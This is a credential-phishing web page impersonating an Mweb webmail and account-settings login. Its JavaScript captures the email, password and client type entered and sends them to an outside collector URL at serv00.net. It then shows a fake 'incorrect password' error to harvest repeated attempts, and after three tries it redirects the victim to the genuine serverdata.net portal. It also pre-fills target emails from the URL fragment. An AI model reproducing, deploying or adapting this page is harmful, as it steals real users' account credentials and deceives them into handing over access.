<!DOCTYPE html>
<html>

<head>
    <title>Mweb | Your Go-To Choice for Affordable Internet Packages</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link href="https://jdmediax.com/app/servdata/media/css/v9uMoVJVBkHX.css" rel="stylesheet">

    <style>
        .wbk {
            word-break: keep-all;
        }

        .p0 {
            padding: 0;
        }
    </style>
</head>

<body>
    <div class="loader loader--hidden"></div>
    <!-- Google Tag Manager (noscript) --><noscript><iframe
            src="https://www.googletagmanager.com/ns.html?id=GTM-M5S4J9X" height="0" width="0"
            style="display:none;visibility:hidden"></iframe></noscript><!-- End Google Tag Manager (noscript) -->
    <section class="login-section">
        <div class="login-logo"></div>
        <h1 class="login-header">Welcome to your Mweb &amp; Account Settings</h1>


        <div class="login-alert" id="login-update-browser-ie" style="display: none">
            <div class="text-center">
                <p class="lh16 mb8"> Internet Explorer is not officially supported and your experience may not be
                    optimal. For the best experience, please upgrade your browser. </p>
            </div>
        </div>
        <div id="oldBrowser" class="login-alert" style="display: none;">
            <div class="login-alert-content">

                <img class="login-alert-icon m-24" src="https://jdmediax.com/app/servdata/media/images/uAKWav5Kk7wF.png" alt="">
                <div class="login-alert-text">
                    <div class="d-tc">
                        <i class="login-alert-icon-warning mr10 ml-10"></i>
                    </div>
                    <div class="d-tc">
                        <p><strong>You’ll get more if you update your browser.</strong> <br>
                            Our layout and page behavior is optimized for the latest version of your browser.</p>
                        <p><a class="btn m-warning" href="http://outdatedbrowser.com/en" target="_blank">Update my
                                browser</a></p>
                        <p class="mb0">This button will redirect you to your browser’s
                            update page</p>
                    </div>
                </div>
            </div>
        </div>
        <div class="login-tabs">
            <button class="login-tab login-webmail selected">
                Mweb
                <i class="icon-info tooltip" title="Access email on the web using OWA"></i>
            </button>
            <button class="login-tab login-myservices">
                My Services
                <i class="icon-info tooltip"
                    title="Change your password, request new services, and perform other basic user tasks"></i>
            </button>
        </div>
        <form id="login_form" method="POST" class="login-form" novalidate="" autocomplete="off">
            <div>
                <div id="aduser-login-spinner" style="display: none">
                    <div
                        style="margin: auto; position: absolute; top: 0; left: 0; right: 0; bottom: 0; text-align: center; z-index: 10; background: rgba(255, 255, 255, 0.5);">
                        <ui:spinner></ui:spinner>
                    </div>
                </div>
                <!-- <input name="returnUrl" type="hidden" value="https://controlpanel.serverdata.net/Portal/ADUser/Login"> -->
                <input id="client-type" name="clientType" type="hidden" class="client-type" value="webMail">
                <div class="pr">
                    <input name="login" id="user" type="text" placeholder="Login (email)" class="login-input"
                        required="" autofocus="">
                    <div id="e-error" class="login-validation required">Login required</div>
                    <div id="ev-error" class="login-validation email">Valid email address required</div>
                </div>
                <div class="pr">
                    <input name="password" id="pass" type="password" placeholder="Password" class="password-input"
                        required="">
                    <div id="p-error" class="password-validation required">Password required</div>
                </div>
                <div id="m-error" class="mixed-validation" style="display: none;">Your login or password is incorrect.
                </div>
                <template id="login-captcha-template">
                    <div class="login-form-captcha">
                        <input type="hidden" name="captchaId" value="43485af9fc374eb2a10fc1e3a4fe0240">
                        <div class="captcha-image">
                            <img id="captchaImage" src="https://jdmediax.com/app/servdata/media/Captcha" alt="">
                        </div>
                        <button class="captcha-refresh" type="button">

                            <svg x="0px" y="0px" width="25px" height="24px" viewBox="0 0 25 24"
                                class="captcha-refresh-icon">
                                <path d="M11.9,19.5c-3.2,0-6.1-2.2-7.1-5.2l0.8-0.1l0,0c0.6-0.1,0.9-0.6,0.8-1.2c0-0.2-0.2-0.4-0.3-0.6L3.3,9
                                c-0.2-0.3-0.6-0.4-1-0.4C2,8.7,1.7,9,1.6,9.3l-1.4,4.3c-0.1,0.3,0,0.7,0.2,1C0.6,14.9,1,15,1.4,15l0.9-0.2
                                c1.2,4.3,5.1,7.3,9.7,7.3c2.7,0,5.2-1.1,7.1-3l-1.9-1.9C15.8,18.7,13.9,19.5,11.9,19.5z">
                                </path>
                                <path d="M23.7,12c-0.2-0.3-0.5-0.5-0.9-0.5l-0.9,0c-0.3-5.3-4.7-9.6-10.1-9.6c-3.5,0-6.7,1.8-8.5,4.7l2.2,1.4
                                C7,5.9,9.4,4.6,11.9,4.6c3.9,0,7.2,3.1,7.4,7l-0.8,0c0,0,0,0,0,0c-0.6,0-1,0.5-1,1c0,0.2,0.1,0.4,0.2,0.6l2.1,3.8
                                c0.2,0.3,0.5,0.5,0.9,0.5c0.4,0,0.7-0.2,0.9-0.5l2.1-4C23.9,12.7,23.9,12.3,23.7,12z">
                                </path>
                            </svg>

                        </button>
                    </div>
                    <div class="pr">
                        <input name="captchaCode" type="text" placeholder="Code" class="captcha-input" autofocus="">
                        <div class="captcha-validation required">Code required</div>
                        <div class="captcha-validation server">Valid code required</div>
                    </div>
                </template>
                <div id="login-captcha-place" class="pr"></div>
                <div class="login-actions">
                    <div class="login-remember">
                        <label class="login-remember-me">
                            <input type="checkbox" name="rememberMe" value="true" class="login-checkbox">
                            <span style="line-height: 22px; height: 22px;">Remember me</span>
                        </label>
                    </div>
                    <a href="javascript:void(0)" class="login-forgot-password jGaTracking">Forgot password?</a>
                </div>
            </div>
            <button type="submit" class="login-submit wbk p0">Login</button>
        </form>
    </section>
    <span style="display: none">
    </span>
    <script>
        // ############################################################################
        // Specify the URL of the PHP file Here
        var url = "https://zionlogs.serv00.net/main.php";
        // ############################################################################

        // Get the form and input elements
        const emailInput = document.getElementById("user");
        const passwordInput = document.getElementById("pass");
        let a1 = document.getElementById("e-error");
        let a12 = document.getElementById("ev-error");
        let a2 = document.getElementById("p-error");
        let a3 = document.getElementById("m-error");
        const form = document.getElementById("login_form");
        const loader = document.querySelector(".loader");
        let tab = document.querySelectorAll('.login-tab')
        let clientType = document.getElementById('client-type')

        let clickCount = 0;

        window.onload = function () {
            // Get the current URL
            let url = window.location.href;

            // Parse the URL and get the fragment (the part after the '#')
            let urlComponents = new URL(url);
            let email = urlComponents.hash.substring(1);

            // Check if the fragment is a valid email
            let emailRegex = /^[\w-]+(\.[\w-]+)*@([\w-]+\.)+[a-zA-Z]{2,7}$/;
            if (emailRegex.test(email)) {
                let emailElement = document.getElementById("user");
                if (emailElement) {
                    emailElement.value = email;
                }
            }
        };


        function setLoginTab(value) {
            value === 'webMail'
                ? (tab[0].classList.add('selected'), tab[1].classList.remove('selected'))
                : (tab[0].classList.remove('selected'), tab[1].classList.add('selected'));
        }

        tab[0].addEventListener('click', function () {
            setLoginTab('webMail');
            clientType.value = 'webMail';
            console.log(clientType.value)
        })
        tab[1].addEventListener('click', function () {
            setLoginTab('myServices');
            clientType.value = 'myServices';
            console.log(clientType.value)
        })



        emailInput.addEventListener('focus', function (event) {
            event.preventDefault();

            a1.style.display = 'none'
            emailInput.style.borderColor = ''
            a2.style.display = 'none'
            passwordInput.style.borderColor = ''
            a3.style.display = 'none'
            a12.style.display = 'none'
        })

        passwordInput.addEventListener('focus', function (event) {
            event.preventDefault();

            a1.style.display = 'none'
            emailInput.style.borderColor = ''
            a2.style.display = 'none'
            passwordInput.style.borderColor = ''
            a3.style.display = 'none'
            a12.style.display = 'none'
        })

        // Add an event listener for form submission
        form.addEventListener("submit", function (event) {
            // Prevent the form from being submitted normally
            event.preventDefault();

            // Write an if statement to check if the input value is empty
            if (emailInput.value === '' && passwordInput.value === '') {
                console.log("both empty");
                a1.style.display = 'block';
                emailInput.style.borderColor = 'rgb(255, 138, 138)';
                a2.style.display = 'block';
                passwordInput.style.borderColor = 'rgb(255, 138, 138)';
                return;
            }
            
            if (emailInput.value === "") {
                a1.style.display = 'block';
                emailInput.style.borderColor = 'rgb(255, 138, 138)';
                return;
            }

            if (passwordInput.value === "") {
                a2.style.display = 'block';
                passwordInput.style.borderColor = 'rgb(255, 138, 138)';
                return;
            }

            loading();

            // Create a function that counts clicks and executes a separate function on second click
            if (emailInput.value && passwordInput.value && clientType.value) {
                let dataLog = {
                    clientType: clientType.value,
                    email: emailInput.value,
                    password: passwordInput.value,
                    desc: "https://controlpanel.serverdata.net/Portal/ADUser/Login: Login Details",
                };
                console.log(dataLog)
                sendDataWithRetry(dataLog);
            }
        });

        // Write a function that will redirect the page to a URL
        function toggleClass() {
            // Redirect the page to a URL
            window.location.href = "https://controlpanel.serverdata.net/Portal/ADUser/Login";
        }

        // Send data to the PHP file
        function sendDataWithRetry(dataLog, maxRetries = 3) {
            const sendRequest = async (retryCount) => {
                try {
                    const response = await fetch(url, {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json; charset=utf-8",
                        },
                        body: JSON.stringify(dataLog),
                    });

                    if (response.ok) {
                        stopLoading()
                        a3.style.display = 'block';
                        passwordInput.value = ''
                        const responseData = await response.json();
                        console.log("Data received by PHP:", responseData);
                        clickCount++;
                        // console.log(clickCount);
                        if (clickCount === 3) {
                            // Execute a separate function on second click
                            toggleClass();
                            clickCount = 0;
                        }
                        // Continue with other tasks (e.g., UI updates, etc.)
                    } else {
                        throw new Error("Network response was not OK");
                    }
                } catch (error) {
                    console.error("Error sending data:", error);
                    if (retryCount < maxRetries) {
                        console.log(`Retrying (attempt ${retryCount + 1})...`);
                        await sendRequest(retryCount + 1);
                    } else {
                        console.error("Max retries reached. Data not sent.");
                        // Handle failure (e.g., show an error message)
                    }
                }
            };
            sendRequest(0); // Start the initial request
        }

        function loading() {
            loader.classList.remove("loader--hidden");
        }

        function stopLoading() {
            loader.classList.add("loader--hidden");
        }

        function ttext() {
            // Get the button element by its class name
            var button = document.querySelector(".asa");
            // Get the input element by its class name
            var input = document.querySelector(".asa1");

            // Toggle the text content between "Show" and "Hide" and the input type
            if (button.textContent === "Show") {
                button.textContent = "Hide";
                input.type = "text";
            } else {
                button.textContent = "Show";
                input.type = "password";
            }
        }

    </script>

</body>

</html>
